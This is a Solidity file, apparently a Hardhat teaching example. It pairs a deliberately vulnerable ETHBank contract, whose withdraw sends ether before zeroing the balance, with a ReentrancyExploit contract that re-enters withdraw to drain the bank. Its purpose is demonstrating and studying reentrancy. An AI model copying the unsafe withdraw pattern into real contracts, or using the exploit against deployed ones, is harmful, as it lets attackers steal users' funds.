// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "hardhat/console.sol";


contract ETHBank {
    mapping(address => uint) public balances;
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function deposit() external payable {
        console.log("Inside ETHBank deposit function");
        balances[msg.sender] += msg.value;
    }

    function withdraw() external payable {
        console.log("Post ETHBank withdraw function");
        (bool sent, ) = msg.sender.call{value: balances[msg.sender]}("");
        console.log("Executed transfer of ether");
        require(sent, "failed to send ETH");

        balances[msg.sender] = 0;
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

interface IEthBank {
    function deposit() external payable;

    function withdraw() external payable;
}


contract ReentrancyExploit {
    IEthBank public bank;

    constructor(IEthBank _bank) {
        bank = _bank;
    }

    receive() external payable {
        console.log("Inside ReentrancyExploit receive function");
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    function pwn() external payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}